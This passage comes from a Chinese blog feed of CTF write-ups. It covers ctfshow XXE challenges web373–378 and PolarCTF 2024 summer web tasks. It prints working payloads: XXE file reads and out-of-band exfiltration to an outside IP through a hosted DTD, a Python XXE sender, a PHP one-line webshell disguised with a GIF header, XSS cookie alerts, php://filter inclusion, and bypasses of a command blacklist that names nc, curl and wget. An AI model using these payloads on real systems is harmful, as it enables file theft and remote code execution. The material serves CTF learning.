encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br>&lt;root&gt;&lt;/root&gt;<br> <br>evil.xml文件内容为：<br>&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://localhost:88/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br></code></pre></td></tr></table></figure><h4 id="加载本地dtd"><a class="markdownIt-Anchor" href="#加载本地dtd"></a> 加载本地DTD</h4><p>这种在刷题的时候不太常见，可以参考上面的参考文章使用。</p><h2 id="四-靶机演练"><a class="markdownIt-Anchor" href="#四-靶机演练"></a> 四、靶机演练</h2><h3 id="1ctfshow-web373"><a class="markdownIt-Anchor" href="#1ctfshow-web373"></a> 1.ctfshow web373</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure><p>代码大题的意思是读取xml，然后在xml文件中提取ctfshow标签中的内容，随后进行echo</p><p>直接尝试构造就行，有回显的还是挺简单的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/web373.png" alt="web373"></p><h3 id="2ctfshow-web374"><a class="markdownIt-Anchor" href="#2ctfshow-web374"></a> 2.ctfshow web374</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure><p>和第一个比较起来，第二个无回显。这个时候需要vps将内容带出来。</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span>[</span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span> </span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtds</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps:8888/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">    <span class="hljs-variable">%dtds</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span>    </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">1</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>然后在服务器上传test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; showflag SYSTEM &#x27;http://8.130.42.113:5566/%file;&#x27;&gt;&quot;&gt;<br>&lt;!--test.dtd的内容，内部的%号要进行实体编码成&amp;#x25;  相当于% showflag--&gt;<br>%dtd;<br>%showflag;<br><br></code></pre></td></tr></table></figure><p>先用python开端口监听</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-1.png" alt="374-1"></p><p>然后再开端口接收内容</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-2.png" alt="374-2"></p><p>最后base解密就可以了</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-3.png" alt="374-3"></p><p>流程:首先在burpsuite的repeated页面构造最上面的payload，利用参数实体，调用%dtds,获得服务器上的test.dtd,再到dtd中的%dtd中的%showflag,这里注意%需要进行实体编码&amp;#x25，把内容带出到我们开的端口上面，最后得到flag。</p><p>ps:我本地没有配置web服务，所以需要开个http服务，如果有配置的话不需要一些步骤，可以参考其他师傅的wp了解一下。</p><h3 id="3ctfshow-web375"><a class="markdownIt-Anchor" href="#3ctfshow-web375"></a> 3.ctfshow web375</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:22:05<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br><br></code></pre></td></tr></table></figure><p>这题和374其实差不多，多了一层验证，判断是否有 ?xml version=“1.0”,如果有就会爆error</p><p>和374流程几乎完全一样只是绕过一下，有两种方法</p><h4 id="方法一"><a class="markdownIt-Anchor" href="#方法一"></a> 方法一:</h4><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/375-1.png" alt="375-1"></p><p>直接去掉就行，会默认是xml文本</p><h4 id="方法二"><a class="markdownIt-Anchor" href="#方法二"></a> 方法二:</h4><p>这里的判断是对整体的判断，中间多加一个空格就可以进行绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml  version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br></code></pre></td></tr></table></figure><p>其他同374进行</p><h3 id="4ctfshow-web376"><a class="markdownIt-Anchor" href="#4ctfshow-web376"></a> 4.ctfshow web376</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:23:51<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br></code></pre></td></tr></table></figure><p>这题比上面多了一层大小写判断，基本没有影响</p><p>就用上面的方法就行</p><p>这里的双引号也可以用单引号进行绕过，不多赘叙</p><h3 id="5ctfshow-web377"><a class="markdownIt-Anchor" href="#5ctfshow-web377"></a> 5.ctfshow web377</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2021-01-07 12:59:52<br># @Last Modified by:   h1xa<br># @Last Modified time: 2021-01-07 15:26:55<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>libxml_disable_entity_loader(false);<br>$xmlfile = file_get_contents(&#x27;php://input&#x27;);<br>if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;, $xmlfile))&#123;<br>    die(&#x27;error&#x27;);<br>&#125;<br>if(isset($xmlfile))&#123;<br>    $dom = new DOMDocument();<br>    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br>highlight_file(__FILE__);    <br><br><br></code></pre></td></tr></table></figure><p>这题比上层多了http的绕过，这题看了师傅的绕法</p><p>正常使用的是utf-8，我们可以编码为utf-16或者utf-32来进行python发包</p><p>直接上payload，这些题目基本是一样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&#x27;http://0197db2a-c2a9-49f9-8823-3868d3a6ae77.challenge.ctf.show/&#x27;</span><br>payload=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;!DOCTYPE hacker[    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="hljs-string">    &lt;!ENTITY % dtds SYSTEM &quot;http://vps:8888/test.dtd&quot;&gt;</span><br><span class="hljs-string">    %dtds;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;</span><br><span class="hljs-string">1</span><br><span class="hljs-string">&lt;/root&gt;&quot;&quot;&quot;</span><br>payload=payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br><span class="hljs-built_in">print</span>(requests.post(url,data=payload).text)<br></code></pre></td></tr></table></figure><h3 id="6ctfshow-web378"><a class="markdownIt-Anchor" href="#6ctfshow-web378"></a> 6.ctfshow web378</h3><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378.png" alt="378"></p><p>f12看看源码定位到了一行</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">contentType:</span> <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span><br></code></pre></td></tr></table></figure><p>那就是xxe无回显的题目了</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378-1.png" alt="378-1"></p><p>简单分析一下，url/doLogin下面进行xxe利用，得到flag,构造username和password</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/378-2.png" alt="378-2"></p><p>得到flag</p><p>还有的例题可以参照我的litctf2024和polarctf2024夏，分别有道考察xxe方面的题目</p><h2 id="五-总结"><a class="markdownIt-Anchor" href="#五-总结"></a> 五、总结</h2><p>以上是我对xxe的浅层次的学习，虽然题目都不算太难，但也算能入个门了，暂时就到这了。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Polarctf2024夏</title>
    <link href="/2024/06/09/polarctf/PolarCTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A82024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2024/06/09/polarctf/PolarCTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A82024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>前言:比赛并没有参加，趁着复习期末写题目放松一会，学习学习知识。</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="upload1"><a class="markdownIt-Anchor" href="#upload1"></a> upload1</h2><p>典型的一句话木马，按照流程来就行</p><p>直接上传一个图片，不能直接连接成功，试着传入htaccess限定只能上传图片那些，那估计就是改图片为php就行</p><p><img src="/../../images/polarctf2024%E5%A4%8F/upload.png" alt="upload"></p><p>然后蚁剑连一下就可以了</p><p><img src="/../../images/polarctf2024%E5%A4%8F/upload1.png" alt="upload1"></p><p>疑惑：我尝试用jpg上传的时候改末尾并不能成功，看官p用的gif，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;attack&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>按道理也应该正常执行的，并不是很理解。</p><h2 id="审计"><a class="markdownIt-Anchor" href="#审计"></a> 审计</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">no no no! &lt;?php<br>error_reporting(0);<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br><br>if (isset($_GET[&#x27;xxs&#x27;])) &#123;<br>    $input = $_GET[&#x27;xxs&#x27;];<br><br>    if (is_array($input)) &#123;<br>        die(&quot;错误：输入类型不允许为数组。&quot;);<br>    &#125;<br>    if (!preg_match(&quot;/^0e[0-9]+$/&quot;, md5($input))) &#123;<br>        die(&quot;错误：输入的MD5值必须以&#x27;0e&#x27;开头，并跟随数字。&quot;);<br>    &#125;<br>    if (!is_numeric($input)) &#123;<br>        die(&quot;错误：输入必须是数字。&quot;);<br>    &#125;<br><br>    die(&quot;恭喜：&quot;.$flag);<br>&#125; else &#123;<br>    die(&quot;错误：必须设置正确参数。&quot;);<br>&#125;<br>?&gt;<br>错误：必须设置正确参数。<br></code></pre></td></tr></table></figure><p>先上源码，先审计一下代码，大体上应该就是关于md5的知识点</p><p>首先不能用数组绕过，然后要0e开头，最后md5加密后不能为数字，直接一把梭了，平时积累的md5加密等于自身就行</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E5%AE%A1%E8%AE%A1.png" alt="审计"></p><h2 id="扫扫看"><a class="markdownIt-Anchor" href="#扫扫看"></a> 扫扫看</h2><p>提醒我们扫一下，用dirsearch扫一下得到flag.php,进去看看</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E6%89%AB.png" alt="扫"></p><p>看一下源码,得到flag</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E6%89%AB1.png" alt="扫1"></p><h2 id="debudao"><a class="markdownIt-Anchor" href="#debudao"></a> debudao</h2><p>内容，先看看源码，有个flag是假的（欸</p><p>尝试sql注入，好像也不是</p><p>尝试ssit注入，也不是</p><p>最后发现是xxe漏洞，这方面我还没怎么学，等暑假好好补补吧</p><p>先用下面的来测试一下，发现有弹窗</p><p><img src="/../../images/polarctf2024%E5%A4%8F/debudao.png" alt="debudao"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>然后跟着wp写的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/../../images/polarctf2024%E5%A4%8F/%E5%BE%97%E4%B8%8D%E5%88%B01.png" alt="得不到1"></p><p>爆出flag，用url解码就可以得到flag了</p><p>想法：按照这个方法的话其实好像可以直接用hackerbar看cookie那一栏，并不需要构造xxe，重新开一次容器发现方法并不可行，哈哈我自己想多了</p><h2 id="dragon"><a class="markdownIt-Anchor" href="#dragon"></a> Dragon</h2><p>按照正常思路来走一遍，和上面的差不多但是都没有回显，最后得出也是xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也是用这个得到的但是不能正常弹窗，和官p学习了一下可以用img</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;img src=0 onerror =alert(1)&gt;<br></code></pre></td></tr></table></figure><p>这样就可以正常的弹窗了，然后和上面的题目一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;img src=0 onerror =alert(document.cookie)&gt;<br></code></pre></td></tr></table></figure><p>获取cookie值，url解码得到flag</p><p>感想:任何比赛都能让人找到自己的不足漏洞，之后一定要狠狠学学。</p><h2 id="tnl"><a class="markdownIt-Anchor" href="#tnl"></a> tnl</h2><p>类型和前几题差不多，也试看看，尝试输入到3的时候会有报错，以为是sql注入，尝试万能语句并没有作用</p><p>也尝试了一下xxe也没有回显</p><p>用bp抓包看看，尝试利用伪协议得到index.php</p><p><img src="/../../images/polarctf2024%E5%A4%8F/tnl.png" alt="tnl"></p><p>这是尝试过后发现源码应该后面本身就包含了.php，得到了源码，base64解密一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;/form&gt;<br>&lt;?php<br>error_reporting(0);<br>@$file = $_POST[&#x27;twothree&#x27;];<br><br>if(isset($file))<br>&#123;<br>if( strpos( $file, &quot;1&quot; ) !==  false || strpos( $file, &quot;2&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;<br>include ($file . &#x27;.php&#x27;);<br>&#125;<br>else&#123;<br>echo &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;twothree&#x27;&#x27; at line 1&quot;;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>看了源码可以得知这并不是sql注入，而是一个伪协议绕过的题目，输入1，2，index可以获得相应的内容</p><p>那么进行简单的构造，我也是第一次看到这种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">twothree=php://filter/convert.base64-encode/index/resource=flag<br></code></pre></td></tr></table></figure><p><img src="/../../images/polarctf2024%E5%A4%8F/tnl1.png" alt="tnl1"></p><p>最后base64解密就可以得到flag了</p><h2 id="你知道sys还能这样玩吗"><a class="markdownIt-Anchor" href="#你知道sys还能这样玩吗"></a> 你知道sys还能这样玩吗</h2><p>根据提示进入sys.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>和国赛的那个有点类似</p><h3 id="方法1"><a class="markdownIt-Anchor" href="#方法1"></a> 方法1：</h3><p>尝试php -r来进行二次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-string">&#x27;system(hex2bin(&quot;6c73202e2e2f&quot;));&#x27;</span><br></code></pre></td></tr></table></figure><p>查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-string">&#x27;system(hex2bin(ff3b636174202f666c61672e747874));&#x27;</span><br></code></pre></td></tr></table></figure><p>ff是进行的一个绕过执行，否则得不到</p><h3 id="方法2"><a class="markdownIt-Anchor" href="#方法2"></a> 方法2：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=`<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;Y2F0IC8q&quot;</span>|bas<span class="hljs-string">&quot;&quot;</span>e64 -d`<br></code></pre></td></tr></table></figure><p>这里看到一个师傅利用了printf和双引号绕过base64加密的方法得到了答案，也放在这，还是比较巧妙的</p><h3 id="方法3"><a class="markdownIt-Anchor" href="#方法3"></a> 方法3：</h3><p>上面几个都是借鉴的，还有一个办法就是八进制转化，之前写xyctf有一个和这样类似的，我就直接上payload了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=$%27\143\141\164%27%3c$%27\57\146\154\141\147\56\164\170\164%27<br></code></pre></td></tr></table></figure><p>详情可参考，<a href="https://0ran9ewww.github.io/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/">文章</a>，ezrce那个部分</p><h2 id="exx"><a class="markdownIt-Anchor" href="#exx"></a> ExX?</h2><p>先搜看看flag{}有个假的flag，那再看看题目吧</p><p>尝试dirsearch扫描得到dom.php,出现了xml的报错很明显就是xxe的漏洞了，同天的lit比赛也是有一个题目是xxe</p><p>不知道原理直接上payload之后打算写一篇专题好好学习</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 